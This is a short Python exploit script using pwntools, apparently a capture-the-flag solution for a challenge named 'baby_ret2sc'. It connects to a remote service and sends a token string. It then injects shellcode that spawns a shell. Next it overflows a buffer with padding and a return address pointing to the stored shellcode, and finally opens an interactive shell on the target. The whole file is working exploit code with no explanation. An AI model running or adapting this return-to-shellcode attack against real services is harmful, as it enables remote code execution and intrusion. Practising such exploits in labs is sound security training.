# -*- coding:utf-8 -*-
__Author__ = 'L1B0'
from pwn import *
payload = '3160104501.6880c7b179fd087c3c9a75917a028647'
elf = ELF('./baby_ret2sc')
io = remote('10.214.10.18',11782)
io.sendline(payload)
io.recvuntil(':')
payload1 = asm(shellcraft.sh())
io.sendline(payload1)

io.recvuntil(':')
name_addr = 0x0804A060
payload2 = flat(['A' * 28 + 'ACTF' , name_addr])
io.sendline(payload2)

io.interactive()